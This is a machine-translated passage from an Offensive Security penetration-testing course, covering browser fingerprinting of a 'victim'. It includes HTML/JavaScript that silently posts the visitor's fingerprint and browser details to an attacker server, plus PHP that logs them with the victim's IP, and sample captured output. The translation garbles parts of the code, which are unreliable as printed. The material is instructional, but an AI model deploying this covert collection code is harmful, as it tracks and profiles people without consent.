<div style="position:absolute;top:116521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:116521;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:116521;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">418</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116041;left:133"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 241：通过 http://developers.whatismybrowser.com 用户代理识别确切的浏览器版本</font></font></i></nobr></div>
<div style="position:absolute;top:116057;left:433"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，用户代理字符串隐含地告诉我们 Microsoft Edge 41 正在 32 位上运行</font></font></nobr></div>
<div style="position:absolute;top:116107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 的版本。对于 64 位版本的 Windows，该字符串将包含</font></font></nobr></div>
<div style="position:absolute;top:116126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 64 位架构的一些信息如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mozilla/5.0 (Windows NT 10.0; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Win64; x64</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) AppleWebKit/537.36 (KHTML, like Gecko) Chrom</font></font></nobr></div>
<div style="position:absolute;top:116178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e/58.0.3029.110 Safari/537 Edge/16.16299</font></font></nobr></div>
<div style="position:absolute;top:116197;left:127"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 382 - 64 位版本的 Windows 上相同版本的 Microsoft Edge 的完整用户代理字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们设法收集了我们想要的信息，但是清单 380 中的 JavaScript 代码</font></font></nobr></div>
<div style="position:absolute;top:116246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向受害者而不是攻击者显示数据。</font><font style="vertical-align: inherit;">这显然不是很有用，所以我们需要</font></font></nobr></div>
<div style="position:absolute;top:116266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到一种方法将提取的信息传输到我们的攻击网络服务器。</font></font></nobr></div>
<div style="position:absolute;top:116298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几行 Ajax </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">338</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码应该可以解决问题。</font><font style="vertical-align: inherit;">清单 383 显示了</font></font></nobr></div>
<div style="position:absolute;top:116317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以前使用的指纹网页。</font><font style="vertical-align: inherit;">在此代码中，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XMLHttpRequest</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> JavaScript API 来</font></font></nobr></div>
<div style="position:absolute;top:116337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 POST 请求与攻击 Web 服务器交互。</font><font style="vertical-align: inherit;">POST 请求是针对</font></font></nobr></div>
<div style="position:absolute;top:116356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与存储恶意网页的服务器相同，因此</font><i><font style="vertical-align: inherit;">xmlhttp.open 中</font></i><font style="vertical-align: inherit;">使用的 URL</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:116376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法未指定 IP 地址。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:116471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">338 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Ajax_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（编程）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:116599;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="99"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 99 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116632;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:117709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:117709;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:117709;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">419</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含由</font><i><font style="vertical-align: inherit;">Fingerprint2</font></i><font style="vertical-align: inherit;">库</font><font style="vertical-align: inherit;">提取的信息</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">components</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数组</font><font style="vertical-align: inherit;">是</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:116747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由几行 JavaScript 代码处理，类似于前面的示例。</font><font style="vertical-align: inherit;">然而这一次，</font></font></nobr></div>
<div style="position:absolute;top:116766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果输出字符串通过 POST 请求发送到 js.php。</font><font style="vertical-align: inherit;">突出显示关键组件</font></font></nobr></div>
<div style="position:absolute;top:116786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的清单 383 中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!doctype html&gt;</font></font></nobr></div>
<div style="position:absolute;top:116838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;</font></font></nobr></div>
<div style="position:absolute;top:116855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:116872;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;title&gt;空白页&lt;/title&gt;</font></font></nobr></div>
<div style="position:absolute;top:116888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/头&gt;</font></font></nobr></div>
<div style="position:absolute;top:116905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;身体&gt;</font></font></nobr></div>
<div style="position:absolute;top:116922;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;h1&gt;你被指指点点了！&lt;/h1&gt;</font></font></nobr></div>
<div style="position:absolute;top:116940;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;script src="fingerprint2.js"&gt;&lt;/script&gt;</font></font></nobr></div>
<div style="position:absolute;top:116956;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:116973;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var d1 = 新日期();</font></font></nobr></div>
<div style="position:absolute;top:116990;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var 选项 = {};</font></font></nobr></div>
<div style="position:absolute;top:117007;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fingerprint2.get(options, function (components) {</font></font></nobr></div>
<div style="position:absolute;top:117024;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var values = components.map(function (component) { return component.value })</font></font></nobr></div>
<div style="position:absolute;top:117041;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var murmur = Fingerprint2.x64hash128(values.join(''), 31)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:117058;left:190"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var clientfp = "客户端浏览器指纹：" + murmur + "\n\n";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117075;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var d2 = 新日期();</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:117092;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var timeString = "指纹计算时间：" + (d2 - d1) + "ms\n\n";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117109;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var details = "详细信息：\n";</font></font></nobr></div>
<div style="position:absolute;top:117126;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if(typeof window.console !== "undefined") {</font></font></nobr></div>
<div style="position:absolute;top:117143;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for（组件中的var索引）{</font></font></nobr></div>
<div style="position:absolute;top:117160;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var obj = 组件[索引];</font></font></nobr></div>
<div style="position:absolute;top:117177;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var 值 = obj.value;</font></font></nobr></div>
<div style="position:absolute;top:117194;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果（值！== 空）{</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:117211;left:222"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var line = obj.key + " = " + value.toString().substr(0, 150);</font></font></b></nobr></div>
<div style="position:absolute;top:117228;left:222"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详情 += 行 + "\n";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117245;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:117262;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:117279;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:117296;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var xmlhttp = new XMLHttpRequest();</font></font></b></nobr></div>
<div style="position:absolute;top:117313;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlhttp.open("POST", "/fp/js.php");</font></font></b></nobr></div>
<div style="position:absolute;top:117330;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlhttp.setRequestHeader("Content-Type", "application/txt");</font></font></b></nobr></div>
<div style="position:absolute;top:117347;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xmlhttp.send(clientfp + timeString + 详细信息);</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117364;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">});</font></font></nobr></div>
<div style="position:absolute;top:117381;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:117397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;</font></font></nobr></div>
<div style="position:absolute;top:117414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:117434;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 383 - 向攻击者服务器发送浏览器信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们看一下攻击服务器上处理POST请求的/fp/js.php PHP代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php</font></font></nobr></div>
<div style="position:absolute;top:117515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$data = "客户端 IP 地址："。</font><font style="vertical-align: inherit;">$_SERVER['REMOTE_ADDR'] 。</font><font style="vertical-align: inherit;">"\n";</font></font></nobr></div>
<div style="position:absolute;top:117532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$data .= file_get_contents('php://input');</font></font></nobr></div>
<div style="position:absolute;top:117549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$data .= "---------------------------------\n\n";</font></font></nobr></div>
<div style="position:absolute;top:117566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEN</font></font></nobr></div>
<div style="position:absolute;top:117583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D | </font><font style="vertical-align: inherit;">LOCK_EX);</font></font></nobr></div>
<div style="position:absolute;top:117600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?&gt;</font></font></nobr></div>
<div style="position:absolute;top:117636;left:160"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 384 - 处理 JavaScript POST 请求并将上传的数据转储到文件的 PHP 代码 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:117787;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="100"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 100 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117820;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:118897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:118897;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:118897;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">420</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 代码首先从 $_SERVER </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">339</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数组中</font><font style="vertical-align: inherit;">提取客户端 IP 地址</font><font style="vertical-align: inherit;">，其中包含 server</font></font></nobr></div>
<div style="position:absolute;top:117935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和执行环境信息。</font><font style="vertical-align: inherit;">然后将 IP 地址连接到文本字符串</font></font></nobr></div>
<div style="position:absolute;top:117954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 JavaScript POST 请求接收并写入指纹中的指纹.txt 文件</font></font></nobr></div>
<div style="position:absolute;top:117974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/www/html/fp/ 目录。</font><font style="vertical-align: inherit;">注意</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE_APPEND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">的使用</font><font style="vertical-align: inherit;">，它允许我们存储</font></font></nobr></div>
<div style="position:absolute;top:117993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个指纹到同一个文件。</font></font></nobr></div>
<div style="position:absolute;top:118026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了使此代码工作，我们需要允许 Apache </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户写入 fp</font></font></nobr></div>
<div style="position:absolute;top:118045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo chown www-data:www-data fp</font></font></font></b></nobr></div>
<div style="position:absolute;top:118100;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 385 - 更改 fp 目录的权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦受害者浏览了fingerprint2server.html 网页（图242），我们就可以检查</font></font></nobr></div>
<div style="position:absolute;top:118148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们攻击服务器上的fingerprint.txt的内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端 IP 地址：10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:118200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端浏览器指纹：ff0435cc84bcac49b15078773c5e3f2e</font></font></nobr></div>
<div style="position:absolute;top:118234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指纹计算时间：625ms</font></font></nobr></div>
<div style="position:absolute;top:118268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细资料： </font></font></nobr></div>
<div style="position:absolute;top:118285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">userAgent = Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrom</font></font></nobr></div>
<div style="position:absolute;top:118302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e/58.0.3029.110 Safari/537.36 Edge/16.16299</font></font></nobr></div>
<div style="position:absolute;top:118319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络驱动程序 = 假</font></font></nobr></div>
<div style="position:absolute;top:118336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言 = en-US</font></font></nobr></div>
<div style="position:absolute;top:118353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">颜色深度 = 24</font></font></nobr></div>
<div style="position:absolute;top:118370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">deviceMemory = 不可用</font></font></nobr></div>
<div style="position:absolute;top:118387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">硬件并发 = 1</font></font></nobr></div>
<div style="position:absolute;top:118404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">屏幕分辨率 = 787,1260</font></font></nobr></div>
<div style="position:absolute;top:118421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用屏幕分辨率 = 747,1260</font></font></nobr></div>
<div style="position:absolute;top:118438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时区偏移 = 420</font></font></nobr></div>
<div style="position:absolute;top:118454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时区 = America/Los_Angeles</font></font></nobr></div>
<div style="position:absolute;top:118472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sessionStorage = 真</font></font></nobr></div>
<div style="position:absolute;top:118489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地存储 = 真</font></font></nobr></div>
<div style="position:absolute;top:118506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">indexedDb = 真</font></font></nobr></div>
<div style="position:absolute;top:118522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加行为 = 假</font></font></nobr></div>
<div style="position:absolute;top:118539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开数据库 = 假</font></font></nobr></div>
<div style="position:absolute;top:118556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cpuClass = 不可用</font></font></nobr></div>
<div style="position:absolute;top:118573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">平台 = Win32</font></font></nobr></div>
<div style="position:absolute;top:118591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plugins = Edge PDF Viewer,Portable Document Format,application/pdf,pdf</font></font></nobr></div>
<div style="position:absolute;top:118607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">画布 = 画布缠绕：是，画布 fp：数据：图像/png；base64，iVBORw0KGgoAAAANSUhEUgAAB9</font></font></nobr></div>
<div style="position:absolute;top:118624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webgl = data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IA</font></font></nobr></div>
<div style="position:absolute;top:118641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webglVendorAndRenderer = Microsoft~Microsoft 基本渲染驱动程序</font></font></nobr></div>
<div style="position:absolute;top:118658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广告块 = 假</font></font></nobr></div>
<div style="position:absolute;top:118675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hasLiedLanguages = false</font></font></nobr></div>
<div style="position:absolute;top:118692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hasLiedResolution = false</font></font></nobr></div>
<div style="position:absolute;top:118709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hasLiedOs = false</font></font></nobr></div>
<div style="position:absolute;top:118726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hasLiedBrowser = false</font></font></nobr></div>
<div style="position:absolute;top:118743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">触摸支持 = 0,false,false</font></font></nobr></div>
<div style="position:absolute;top:118760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字体 = Arial,Arial Black,Arial Narrow,Arial Rounded MT Bold,Book Antiqua,Bookman Old</font></font></nobr></div>
<div style="position:absolute;top:118777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">音频 = 124.08073878219147</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:118847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">339 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://www.php.net/manual/en/reserved.variables.server.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:118975;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="101"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 101 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:119008;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:120085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:120085;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:120085;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">421</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119104;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 386 - 发送到服务器的浏览器指纹信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过此修改，受害者的浏览器中将不会显示任何信息。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:119152;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XMLHttpRequest</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">悄悄地将数据传输到我们的攻击服务器，而无需任何来自</font></font></nobr></div>
<div style="position:absolute;top:119172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者。</font><font style="vertical-align: inherit;">受害者看到的唯一输出是我们选择的文本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119582;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 242：通过 XMLHttpRequest 请求进行浏览器指纹识别</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119613;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.2.3 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119648;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：这些练习不需要报告</font></font></i></nobr></div>
<div style="position:absolute;top:119681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 确定您的公共 IP 地址。</font><font style="vertical-align: inherit;">使用公共信息源，看看你能学到什么</font></font></nobr></div>
<div style="position:absolute;top:119700;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于您的 IP 地址。</font><font style="vertical-align: inherit;">如果在您的特定 IP 地址上没有找到任何内容，请尝试使用 C 类</font></font></nobr></div>
<div style="position:absolute;top:119719;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的一部分。</font></font></nobr></div>
<div style="position:absolute;top:119748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 比较您可以收集的有关您的家庭 IP 地址的信息与收集的信息</font></font></nobr></div>
<div style="position:absolute;top:119767;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的工作 IP 地址。</font><font style="vertical-align: inherit;">想想攻击者如何将发现的信息用作</font></font></nobr></div>
<div style="position:absolute;top:119787;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击的一部分。</font></font></nobr></div>
